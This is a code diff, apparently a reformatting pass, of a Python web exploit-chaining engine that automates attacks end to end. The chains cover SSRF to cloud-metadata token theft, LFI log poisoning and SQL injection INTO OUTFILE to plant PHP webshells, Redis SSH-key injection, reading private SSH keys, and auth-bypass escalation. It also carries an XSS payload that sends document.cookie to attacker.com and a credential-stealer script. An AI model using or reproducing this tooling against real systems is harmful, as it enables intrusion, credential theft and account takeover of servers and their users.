@@ -62,19 +62,41 @@ SQLI_OUTFILE_PATHS = [
 ]
 
 DEBUG_ENDPOINTS = [
-    "/actuator", "/actuator/env", "/actuator/health", "/actuator/beans",
-    "/actuator/heapdump", "/actuator/threaddump", "/actuator/loggers",
-    "/actuator/configprops", "/actuator/mappings", "/.env", "/debug",
-    "/api/debug", "/api/health", "/api/info", "/api/env",
-    "/console", "/h2-console", "/h2", "/api/swagger-ui.html",
-    "/api/v1/debug", "/api/v2/debug", "/_debug",
+    "/actuator",
+    "/actuator/env",
+    "/actuator/health",
+    "/actuator/beans",
+    "/actuator/heapdump",
+    "/actuator/threaddump",
+    "/actuator/loggers",
+    "/actuator/configprops",
+    "/actuator/mappings",
+    "/.env",
+    "/debug",
+    "/api/debug",
+    "/api/health",
+    "/api/info",
+    "/api/env",
+    "/console",
+    "/h2-console",
+    "/h2",
+    "/api/swagger-ui.html",
+    "/api/v1/debug",
+    "/api/v2/debug",
+    "/_debug",
     "/wp-admin/admin-ajax.php?action=debug",
 ]
 
 CLOUD_CRED_PATTERNS = [
-    (r"(?i)(?:AWS_ACCESS_KEY_ID|ACCESS_KEY|AWS_SECRET_KEY|AWS_SECRET_ACCESS_KEY)\s*[=:]\s*(\S+)", "aws"),
+    (
+        r"(?i)(?:AWS_ACCESS_KEY_ID|ACCESS_KEY|AWS_SECRET_KEY|AWS_SECRET_ACCESS_KEY)\s*[=:]\s*(\S+)",
+        "aws",
+    ),
     (r"(?i)(?:AZURE_CLIENT_ID|AZURE_TENANT_ID|AZURE_CLIENT_SECRET)\s*[=:]\s*(\S+)", "azure"),
-    (r"(?i)(?:GOOGLE_APPLICATION_CREDENTIALS|GCP_PROJECT|GCP_SERVICE_ACCOUNT)\s*[=:]\s*(\S+)", "gcp"),
+    (
+        r"(?i)(?:GOOGLE_APPLICATION_CREDENTIALS|GCP_PROJECT|GCP_SERVICE_ACCOUNT)\s*[=:]\s*(\S+)",
+        "gcp",
+    ),
     (r"(?i)(?:DB_USERNAME|DB_PASSWORD|DATABASE_URL|JDBC_URL)\s*[=:]\s*(\S+)", "database"),
     (r"(?i)(?:API_KEY|API_SECRET|APP_SECRET|SECRET_KEY|ENCRYPTION_KEY)\s*[=:]\s*(\S+)", "secret"),
     (r"(?i)(?:PRIVATE_KEY|-----BEGIN\s*(?:RSA\s*)?PRIVATE KEY-----)", "private_key"),
@@ -82,8 +104,9 @@ CLOUD_CRED_PATTERNS = [
 ]
 
 
-def _try_ssrf_cloud_metadata(param: str, sess: requests.Session,
-                              base_url: str, timeout: float) -> Dict:
+def _try_ssrf_cloud_metadata(
+    param: str, sess: requests.Session, base_url: str, timeout: float
+) -> Dict:
     result = {"chain": "ssrf_to_metadata", "success": False, "cloud": None, "evidence": []}
 
     for cloud, urls in CLOUD_METADATA_URLS.items():
@@ -94,11 +117,13 @@ def _try_ssrf_cloud_metadata(param: str, sess: requests.Session,
                 if r.status_code == 200 and len(r.text) > 10:
                     result["success"] = True
                     result["cloud"] = cloud
-                    result["evidence"].append({
-                        "url": url,
-                        "size": len(r.text),
-                        "preview": r.text[:200].strip(),
-                    })
+                    result["evidence"].append(
+                        {
+                            "url": url,
+                            "size": len(r.text),
+                            "preview": r.text[:200].strip(),
+                        }
+                    )
                     found_creds = re.findall(
                         r"(?i)(secret|password|token|key|credential)\s*[:=]\s*\S+",
                         r.text,
@@ -114,8 +139,7 @@ def _try_ssrf_cloud_metadata(param: str, sess: requests.Session,
     return result
 
 
-def _try_lfi_log_poison(param: str, sess: requests.Session,
-                         base_url: str, timeout: float) -> Dict:
+def _try_lfi_log_poison(param: str, sess: requests.Session, base_url: str, timeout: float) -> Dict:
     result = {"chain": "lfi_to_rce", "success": False, "method": None, "evidence": []}
 
     php_code = '<?php system("id;whoami"); ?>'
@@ -136,10 +160,12 @@ def _try_lfi_log_poison(param: str, sess: requests.Session,
             if r.status_code == 200 and r.text and "uid=" in r.text:
                 result["success"] = True
                 result["method"] = "log_poison"
-                result["evidence"].append({
-                    "log_path": log_path,
-                    "preview": r.text[:200].strip(),
-                })
+                result["evidence"].append(
+                    {
+                        "log_path": log_path,
+                        "preview": r.text[:200].strip(),
+                    }
+                )
                 return result
         except requests.RequestException:
             continue
@@ -147,8 +173,7 @@ def _try_lfi_log_poison(param: str, sess: requests.Session,
     return result
 
 
-def _try_sqli_to_shell(param: str, sess: requests.Session,
-                        base_url: str, timeout: float) -> Dict:
+def _try_sqli_to_shell(param: str, sess: requests.Session, base_url: str, timeout: float) -> Dict:
     result = {"chain": "sqli_to_rce", "success": False, "method": None, "evidence": []}
 
     outfile_payloads = [
@@ -174,11 +199,13 @@ def _try_sqli_to_shell(param: str, sess: requests.Session,
                         if r2.status_code == 200 and "uid=" in r2.text:
                             result["success"] = True
                             result["method"] = "into_outfile"
-                            result["evidence"].append({
-                                "shell_path": path,
-                                "shell_url": shell_url + "?c=id",
-                                "output": r2.text[:200].strip(),
-                            })
+                            result["evidence"].append(
+                                {
+                                    "shell_path": path,
+                                    "shell_url": shell_url + "?c=id",
+                                    "output": r2.text[:200].strip(),
+                                }
+                            )
                             return result
                     except requests.RequestException:
                         pass
@@ -194,8 +221,7 @@ def _try_sqli_to_shell(param: str, sess: requests.Session,
     return result
 
 
-def _try_deser_to_rce(param: str, sess: requests.Session,
-                       base_url: str, timeout: float) -> Dict:
+def _try_deser_to_rce(param: str, sess: requests.Session, base_url: str, timeout: float) -> Dict:
     result = {"chain": "deser_to_rce", "success": False, "method": None, "evidence": []}
 
     java_gadgets = [
@@ -230,20 +256,21 @@ def _try_deser_to_rce(param: str, sess: requests.Session,
     return result
 
 
-def _try_xss_csrf_hijack(param: str, sess: requests.Session,
-                          base_url: str, timeout: float) -> Dict:
+def _try_xss_csrf_hijack(param: str, sess: requests.Session, base_url: str, timeout: float) -> Dict:
     result = {"chain": "xss_to_account_hijack", "success": False, "evidence": []}
 
-    xss_payload = '<img src=x onerror="fetch(\'https://attacker.com/log?c=\'+document.cookie)">'
+    xss_payload = "<img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">"
     test_url = base_url.replace(param + "=", param + "=" + xss_payload)
     try:
         r = sess.get(test_url, timeout=timeout)
         if xss_payload[:30] in r.text:
             result["success"] = True
-            result["evidence"].append({
-                "type": "stored_xss_with_csrf_potential",
-                "payload": xss_payload[:80],
-            })
+            result["evidence"].append(
+                {
+                    "type": "stored_xss_with_csrf_potential",
+                    "payload": xss_payload[:80],
+                }
+            )
     except requests.RequestException:
         pass
 
@@ -257,10 +284,12 @@ def _try_xss_csrf_hijack(param: str, sess: requests.Session,
     try:
         r2 = sess.get(test_url2, timeout=timeout)
         if csrf_xss[:40] in r2.text:
-            result["evidence"].append({
-                "type": "csrf_auto_form",
-                "risk": "critical: one-click account takeover",
-            })
+            result["evidence"].append(
+                {
+                    "type": "csrf_auto_form",
+                    "risk": "critical: one-click account takeover",
+                }
+            )
             result["success"] = True
     except requests.RequestException:
         pass
@@ -268,15 +297,21 @@ def _try_xss_csrf_hijack(param: str, sess: requests.Session,
     return result
 
 
-def _try_auth_escalation(param: str, sess: requests.Session,
-                          base_url: str, timeout: float) -> Dict:
+def _try_auth_escalation(param: str, sess: requests.Session, base_url: str, timeout: float) -> Dict:
     result: Dict[str, Any] = {"chain": "auth_bypass_to_admin", "success": False, "evidence": []}
 
     admin_paths = [
-        "/admin", "/admin/users", "/admin/config", "/admin/settings",
-        "/administrator", "/panel", "/dashboard",
-        "/api/admin", "/api/v1/admin",
-        "/wp-admin", "/wp-admin/users.php",
+        "/admin",
+        "/admin/users",
+        "/admin/config",
+        "/admin/settings",
+        "/administrator",
+        "/panel",
+        "/dashboard",
+        "/api/admin",
+        "/api/v1/admin",
+        "/wp-admin",
+        "/wp-admin/users.php",
     ]
 
     bypass_headers = [
@@ -293,18 +328,17 @@ def _try_auth_escalation(param: str, sess: requests.Session,
             try:
                 r = sess.get(test_url, headers=headers, timeout=timeout)
                 if r.status_code == 200 and r.text:
-                    has_login = any(
-                        kw in r.text.lower() for kw in
-                        ["login", "password", "sign in"]
-                    )
+                    has_login = any(kw in r.text.lower() for kw in ["login", "password", "sign in"])
                     if not has_login or r.status_code == 200:
                         result["success"] = True
-                        result["evidence"].append({
-                            "url": test_url,
-                            "status": r.status_code,
-                            "headers_used": headers,
-                            "size": len(r.text),
-                        })
+                        result["evidence"].append(
+                            {
+                                "url": test_url,
+                                "status": r.status_code,
+                                "headers_used": headers,
+                                "size": len(r.text),
+                            }
+                        )
                         if len(result["evidence"]) >= 3:
                             return result
             except requests.RequestException:
@@ -313,8 +347,9 @@ def _try_auth_escalation(param: str, sess: requests.Session,
     return result
 
 
-def _try_ssrf_to_internal_scan(param: str, sess: requests.Session,
-                                base_url: str, timeout: float) -> Dict:
+def _try_ssrf_to_internal_scan(
+    param: str, sess: requests.Session, base_url: str, timeout: float
+) -> Dict:
     result = {"chain": "ssrf_to_internal_scan", "success": False, "evidence": []}
 
     internal_targets = [
@@ -344,19 +379,20 @@ def _try_ssrf_to_internal_scan(param: str, sess: requests.Session,
             r = sess.get(test_url, timeout=timeout, allow_redirects=False)
             if r.status_code < 500 and r.status_code not in (404, 400):
                 result["success"] = True
-                result["evidence"].append({
-                    "internal_url": internal_url,
-                    "status": r.status_code,
-                    "size": len(r.text),
-                })
+                result["evidence"].append(
+                    {
+                        "internal_url": internal_url,
+                        "status": r.status_code,
+                        "size": len(r.text),
+                    }
+                )
         except (requests.RequestException, ConnectionError):
             continue
 
     return result
 
 
-def _try_ssrf_redis_rce(param: str, sess: requests.Session,
-                         base_url: str, timeout: float) -> Dict:
+def _try_ssrf_redis_rce(param: str, sess: requests.Session, base_url: str, timeout: float) -> Dict:
     result = {"chain": "ssrf_redis_rce", "success": False, "evidence": []}
     ssh_key = os.path.expanduser("~/.ssh/id_rsa.pub")
     ssh_pub = ""
@@ -389,8 +425,9 @@ def _try_ssrf_redis_rce(param: str, sess: requests.Session,
     return result
 
 
-def _try_lfi_ssh_key_extract(param: str, sess: requests.Session,
-                              base_url: str, timeout: float) -> Dict:
+def _try_lfi_ssh_key_extract(
+    param: str, sess: requests.Session, base_url: str, timeout: float
+) -> Dict:
     result = {"chain": "lfi_ssh_extract", "success": False, "evidence": []}
     ssh_paths = [
         "/root/.ssh/id_rsa",
@@ -408,10 +445,12 @@ def _try_lfi_ssh_key_extract(param: str, sess: requests.Session,
             r = sess.get(test_url, timeout=timeout)
             if r.status_code == 200 and r.text and "BEGIN " in r.text:
                 result["success"] = True
-                result["evidence"].append({
-                    "path": path,
-                    "preview": r.text[:200],
-                })
+                result["evidence"].append(
+                    {
+                        "path": path,
+                        "preview": r.text[:200],
+                    }
+                )
                 result["ssh_key_path"] = path
                 result["ssh_key_content"] = r.text
                 return result
@@ -420,9 +459,13 @@ def _try_lfi_ssh_key_extract(param: str, sess: requests.Session,
     return result
 
 
-def _try_lfi_auto_webshell(param: str, sess: requests.Session,
-                            base_url: str, timeout: float,
-                            base_path: str = "/var/www/html") -> Dict:
+def _try_lfi_auto_webshell(
+    param: str,
+    sess: requests.Session,
+    base_url: str,
+    timeout: float,
+    base_path: str = "/var/www/html",
+) -> Dict:
     result = {"chain": "lfi_auto_webshell", "success": False, "evidence": []}
 
     poison_headers = {
@@ -431,11 +474,13 @@ def _try_lfi_auto_webshell(param: str, sess: requests.Session,
         "Cookie": "PHPSESSID=" + base64.b64encode(b"<?php system('id');?>").decode(),
     }
 
-    for log_path in ["/var/log/apache2/access.log",
-                      "/var/log/apache/access.log",
-                      "/var/log/nginx/access.log",
-                      "/var/log/httpd/access_log",
-                      "C:/xampp/apache/logs/access.log"]:
+    for log_path in [
+        "/var/log/apache2/access.log",
+        "/var/log/apache/access.log",
+        "/var/log/nginx/access.log",
+        "/var/log/httpd/access_log",
+        "C:/xampp/apache/logs/access.log",
+    ]:
         try:
             sess.get(base_url, headers=poison_headers, timeout=timeout)
         except Exception:
@@ -446,11 +491,13 @@ def _try_lfi_auto_webshell(param: str, sess: requests.Session,
             r = sess.get(read_url, timeout=timeout)
             if r.status_code == 200 and "SHELL_READY" in r.text:
                 result["success"] = True
-                result["evidence"].append({
-                    "method": "log_poison",
-                    "log_path": log_path,
-                    "output": re.sub(r'<[^>]+>', '', r.text)[:200].strip(),
-                })
+                result["evidence"].append(
+                    {
+                        "method": "log_poison",
+                        "log_path": log_path,
+                        "output": re.sub(r"<[^>]+>", "", r.text)[:200].strip(),
+                    }
+                )
                 break
         except Exception:
             continue
@@ -467,20 +514,35 @@ def _try_lfi_auto_webshell(param: str, sess: requests.Session,
                 r = sess.get(read_url, timeout=timeout)
                 if r.status_code == 200 and len(r.text) > 50:
                     if expected and expected in r.text:
-                        result["evidence"].append({"method": "php_filter", "wrapper": wrapper, "preview": r.text[:100]})
+                        result["evidence"].append(
+                            {"method": "php_filter", "wrapper": wrapper, "preview": r.text[:100]}
+                        )
                     elif not expected and r.status_code == 200:
-                        result["evidence"].append({"method": "php_filter_response", "wrapper": wrapper, "preview": r.text[:100]})
+                        result["evidence"].append(
+                            {
+                                "method": "php_filter_response",
+                                "wrapper": wrapper,
+                                "preview": r.text[:100],
+                            }
+                        )
             except Exception:
                 continue
 
-        proc_paths = ["/proc/self/fd/7", "/proc/self/fd/10", "/proc/self/fd/15",
-                       "/proc/self/fd/20", "/proc/self/fd/25"]
+        proc_paths = [
+            "/proc/self/fd/7",
+            "/proc/self/fd/10",
+            "/proc/self/fd/15",
+            "/proc/self/fd/20",
+            "/proc/self/fd/25",
+        ]
         for fd in proc_paths:
             read_url = base_url.replace(param + "=", param + "=" + fd)
             try:
                 r = sess.get(read_url, timeout=timeout)
                 if r.status_code == 200 and len(r.text) > 20:
-                    result["evidence"].append({"method": "proc_fd_leak", "path": fd, "preview": r.text[:100]})
+                    result["evidence"].append(
+                        {"method": "proc_fd_leak", "path": fd, "preview": r.text[:100]}
+                    )
             except Exception:
                 continue
 
@@ -490,8 +552,9 @@ def _try_lfi_auto_webshell(param: str, sess: requests.Session,
     return result
 
 
-def _try_ssrf_cloud_creds_extract(param: str, sess: requests.Session,
-                                    base_url: str, timeout: float) -> Dict:
+def _try_ssrf_cloud_creds_extract(
+    param: str, sess: requests.Session, base_url: str, timeout: float
+) -> Dict:
     result = {"chain": "ssrf_cloud_creds", "success": False, "credentials": [], "cloud": None}
 
     metadata_targets = {
@@ -502,12 +565,24 @@ def _try_ssrf_cloud_creds_extract(param: str, sess: requests.Session,
             ("http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key", "aws_ssh"),
         ],
         "gcp": [
-            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "gcp_token"),
-            ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", "gcp_sa"),
-            ("http://metadata.google.internal/computeMetadata/v1/project/project-id", "gcp_project"),
+            (
+                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                "gcp_token",
+            ),
+            (
+                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
+                "gcp_sa",
+            ),
+            (
+                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+                "gcp_project",
+            ),
         ],
         "azure": [
-            ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com", "azure_token"),
+            (
+                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com",
+                "azure_token",
+            ),
             ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_instance"),
         ],
         "alibaba": [
@@ -563,7 +638,9 @@ def _extract_creds_from_text(text: str) -> list:
     if "secret" in text.lower() or "key" in text.lower() or "token" in text.lower():
         lines = [l.strip() for l in text.split("\n") if l.strip()]
         for line in lines[:10]:
-            if any(kw in line.lower() for kw in ["secret", "key", "token", "password", "credential"]):
+            if any(
+                kw in line.lower() for kw in ["secret", "key", "token", "password", "credential"]
+            ):
                 found.append({"type": "raw_leak", "value": line[:120]})
     return found
 
@@ -604,13 +681,14 @@ def _try_debug_abuse(url: str, sess: requests.Session, timeout: float) -> Dict:
             continue
 
     if result["evidence"]:
-        result["success"] = any(e.get("credentials") or e.get("env_credentials")
-                                 for e in result["evidence"]) or len(result["evidence"]) >= 3
+        result["success"] = (
+            any(e.get("credentials") or e.get("env_credentials") for e in result["evidence"])
+            or len(result["evidence"]) >= 3
+        )
     return result
 
 
-def _try_xss_cred_steal(param: str, sess: requests.Session,
-                         base_url: str, timeout: float) -> Dict:
+def _try_xss_cred_steal(param: str, sess: requests.Session, base_url: str, timeout: float) -> Dict:
     result = {"chain": "xss_cred_steal", "success": False, "evidence": []}
     stealer_payload = (
         '<script>fetch("/api/user").then(r=>r.text()).then(d=>{'
@@ -621,11 +699,13 @@ def _try_xss_cred_steal(param: str, sess: requests.Session,
         r = sess.get(test_url, timeout=timeout)
         if stealer_payload[:30] in r.text:
             result["success"] = True
-            result["evidence"].append({
-                "type": "xss_cred_stealer_ready",
-                "payload": stealer_payload[:80],
-                "note": "Deploy with collaborator URL to capture creds"
-            })
+            result["evidence"].append(
+                {
+                    "type": "xss_cred_stealer_ready",
+                    "payload": stealer_payload[:80],
+                    "note": "Deploy with collaborator URL to capture creds",
+                }
+            )
     except requests.RequestException:
         pass
     return result
@@ -665,6 +745,7 @@ class ChainEngine:
         db = sql_injection.check(url, param, self.sess, self.timeout)
         if db.get("vulnerable"):
             from tools.sqli_weaponizer import check as sqli_extract
+
             extract = sqli_extract(url, param, self.sess, self.timeout)
             result["steps"].append(extract)
             result["success"] = extract.get("vulnerable", False)
@@ -672,6 +753,7 @@ class ChainEngine:
                 result["data_extracted"] = extract["data"]
         else:
             from tools.sqli_blind import check as blind_check
+
             blind = blind_check(url, param, self.sess, self.timeout)
             if blind.get("vulnerable"):
                 result["steps"].append({"chain": "blind_sqli", "vulnerable": True})
@@ -688,6 +770,7 @@ class ChainEngine:
             raw_text = " ".join(str(c) for c in creds_extracted)
             try:
                 from tools.cloud_pwn import check as cloud_pwn
+
                 cloud_result = cloud_pwn(raw_text)
                 result["cloud_pwn"] = cloud_result
                 if cloud_result.get("success"):
@@ -711,11 +794,13 @@ class ChainEngine:
                                 timeout=self.timeout,
                             )
                             if r.status_code == 200:
-                                result["steps"].append({
-                                    "chain": "actuator_env_leak",
-                                    "success": True,
-                                    "evidence": r.text[:500],
-                                })
+                                result["steps"].append(
+                                    {
+                                        "chain": "actuator_env_leak",
+                                        "success": True,
+                                        "evidence": r.text[:500],
+                                    }
+                                )
                         except requests.RequestException:
                             pass
                     elif "6379" in internal_url or "redis" in internal_url:
@@ -724,9 +809,7 @@ class ChainEngine:
                             result["steps"].append(redis_result)
                             result["pwned"] = True
 
-        result["success"] = any(
-            s.get("success") for s in result["steps"]
-        )
+        result["success"] = any(s.get("success") for s in result["steps"])
         return result
 
     def chain_lfi_to_rce(self, url: str, param: str) -> Dict:
@@ -741,11 +824,13 @@ class ChainEngine:
         try:
             r = self.sess.get(proc_self, timeout=self.timeout)
             if r.status_code == 200 and len(r.text) > 20:
-                result["steps"].append({
-                    "chain": "proc_self_environ_leak",
-                    "success": True,
-                    "evidence": r.text[:500],
-                })
+                result["steps"].append(
+                    {
+                        "chain": "proc_self_environ_leak",
+                        "success": True,
+                        "evidence": r.text[:500],
+                    }
+                )
         except requests.RequestException:
             pass
 
@@ -762,11 +847,13 @@ class ChainEngine:
 
         dbms_extract = sql_injection.check(url, param, self.sess, self.timeout)
         if dbms_extract.get("vulnerable"):
-            result["steps"].append({
-                "chain": "sqli_data_extraction",
-                "dbms": dbms_extract.get("dbms", "unknown"),
-                "vulnerable": True,
-            })
+            result["steps"].append(
+                {
+                    "chain": "sqli_data_extraction",
+                    "dbms": dbms_extract.get("dbms", "unknown"),
+                    "vulnerable": True,
+                }
+            )
 
         result["success"] = any(s.get("success") for s in result["steps"])
         return result
@@ -786,12 +873,14 @@ class ChainEngine:
 
         ab = auth_bypass.check(url, self.sess, self.timeout)
         if ab.get("vulnerable"):
-            result["steps"].append({
-                "chain": "auth_bypass_general",
-                "vulnerable": True,
-                "path_bypasses": len(ab.get("path_bypasses", [])),
-                "header_bypasses": len(ab.get("header_bypasses", [])),
-            })
+            result["steps"].append(
+                {
+                    "chain": "auth_bypass_general",
+                    "vulnerable": True,
+                    "path_bypasses": len(ab.get("path_bypasses", [])),
+                    "header_bypasses": len(ab.get("header_bypasses", [])),
+                }
+            )
             result["success"] = True
 
         return result
@@ -848,7 +937,9 @@ class ChainEngine:
         result["steps"].append(debug)
         result["success"] = debug["success"]
         if debug.get("evidence"):
-            result["debug_endpoints"] = [e["endpoint"] for e in debug["evidence"] if "endpoint" in e]
+            result["debug_endpoints"] = [
+                e["endpoint"] for e in debug["evidence"] if "endpoint" in e
+            ]
             all_creds = []
             for e in debug["evidence"]:
                 all_creds.extend(e.get("credentials", []) or [])
@@ -857,8 +948,7 @@ class ChainEngine:
                 result["credentials_extracted"] = all_creds
         return result
 
-    def full_chain(self, url: str, param: str, lhost: str = "LHOST",
-                    lport: int = 4444) -> Dict:
+    def full_chain(self, url: str, param: str, lhost: str = "LHOST", lport: int = 4444) -> Dict:
         result = {"target": "%s?%s=" % (url, param), "chains": {}}
 
         det = {}
@@ -898,31 +988,74 @@ class ChainEngine:
                     logger.debug("full_chain %s: %s", name, e)
                     result["chains"][name] = {"error": str(e)}
 
-        result["overall_success"] = any(
-            c.get("success") for c in result["chains"].values()
-        )
+        result["overall_success"] = any(c.get("success") for c in result["chains"].values())
         return result
 
     # ------------------------------------------------------------------
     # Rule-based automatic chain composition from findings
     # ------------------------------------------------------------------
     AUTO_CHAIN_RULES = [
-        ("ssrf_containing_file", ["ssrf"], ["file://"], "ssrf_to_rce",
-         lambda f: any("file://" in str(e.get("payload", "")) for e in f.get("evidence", []))),
-        ("ssrf_cloud_metadata", ["ssrf"], ["meta", "169.254"], "ssrf_cloud_pwn",
-         lambda f: any("169.254" in str(e) or "metadata" in str(e) for e in f.get("evidence", []))),
-        ("lfi_log_poison_possible", ["lfi"], ["log", "access"], "lfi_to_rce",
-         lambda f: any("log" in str(e).lower() for e in f.get("evidence", []))),
-        ("lfi_php_wrapper", ["lfi"], ["php://"], "lfi_auto_webshell",
-         lambda f: any("php://" in str(e) for e in f.get("evidence", []))),
-        ("sqli_outfile", ["sqli"], ["intoout", "outfile"], "sqli_to_rce",
-         lambda f: any("outfile" in str(e).lower() or "intoout" in str(e).lower() for e in f.get("evidence", []))),
-        ("sqli_union", ["sqli"], ["union", "extract"], "sqli_to_data",
-         lambda f: f.get("type") in ("union", "error_based")),
-        ("xss_stored", ["xss"], ["stored", "saved"], "xss_to_hijack",
-         lambda f: "stored" in str(f.get("type", "")).lower()),
-        ("deser_gadget", ["deser"], ["rO0ABX", "java", "O:10"], "deser_to_rce",
-         lambda f: any("rO0ABX" in str(e) or "O:10" in str(e) for e in f.get("evidence", []))),
+        (
+            "ssrf_containing_file",
+            ["ssrf"],
+            ["file://"],
+            "ssrf_to_rce",
+            lambda f: any("file://" in str(e.get("payload", "")) for e in f.get("evidence", [])),
+        ),
+        (
+            "ssrf_cloud_metadata",
+            ["ssrf"],
+            ["meta", "169.254"],
+            "ssrf_cloud_pwn",
+            lambda f: any(
+                "169.254" in str(e) or "metadata" in str(e) for e in f.get("evidence", [])
+            ),
+        ),
+        (
+            "lfi_log_poison_possible",
+            ["lfi"],
+            ["log", "access"],
+            "lfi_to_rce",
+            lambda f: any("log" in str(e).lower() for e in f.get("evidence", [])),
+        ),
+        (
+            "lfi_php_wrapper",
+            ["lfi"],
+            ["php://"],
+            "lfi_auto_webshell",
+            lambda f: any("php://" in str(e) for e in f.get("evidence", [])),
+        ),
+        (
+            "sqli_outfile",
+            ["sqli"],
+            ["intoout", "outfile"],
+            "sqli_to_rce",
+            lambda f: any(
+                "outfile" in str(e).lower() or "intoout" in str(e).lower()
+                for e in f.get("evidence", [])
+            ),
+        ),
+        (
+            "sqli_union",
+            ["sqli"],
+            ["union", "extract"],
+            "sqli_to_data",
+            lambda f: f.get("type") in ("union", "error_based"),
+        ),
+        (
+            "xss_stored",
+            ["xss"],
+            ["stored", "saved"],
+            "xss_to_hijack",
+            lambda f: "stored" in str(f.get("type", "")).lower(),
+        ),
+        (
+            "deser_gadget",
+            ["deser"],
+            ["rO0ABX", "java", "O:10"],
+            "deser_to_rce",
+            lambda f: any("rO0ABX" in str(e) or "O:10" in str(e) for e in f.get("evidence", [])),
+        ),
     ]
 
     def auto_compose(self, findings: Dict[str, Dict]) -> List[Dict]:
@@ -934,18 +1067,19 @@ class ChainEngine:
                     continue
                 if not matcher(finding):
                     continue
-                paths.append({
-                    "rule": rule_name,
-                    "chain": chain_name,
-                    "from_vuln": vtype,
-                    "finding_id": finding_id,
-                    "url": finding.get("url"),
-                    "param": finding.get("param"),
-                })
+                paths.append(
+                    {
+                        "rule": rule_name,
+                        "chain": chain_name,
+                        "from_vuln": vtype,
+                        "finding_id": finding_id,
+                        "url": finding.get("url"),
+                        "param": finding.get("param"),
+                    }
+                )
         return paths
 
-    def execute_auto_chains(self, findings: Dict[str, Dict],
-                            url: str, param: str) -> Dict:
+    def execute_auto_chains(self, findings: Dict[str, Dict], url: str, param: str) -> Dict:
         composed = self.auto_compose(findings)
         result = {"composed_chains": composed, "results": {}}
         for entry in composed:
@@ -995,7 +1129,12 @@ class ChainEngine:
         return fn(url, param)
 
 
-def run(url: str, param: str, sess: Optional[requests.Session] = None,
-        timeout: float = 10.0, chain: str = "full_chain") -> Dict:
+def run(
+    url: str,
+    param: str,
+    sess: Optional[requests.Session] = None,
+    timeout: float = 10.0,
+    chain: str = "full_chain",
+) -> Dict:
     engine = ChainEngine(sess, timeout)
     return engine.run(url, param, chain)
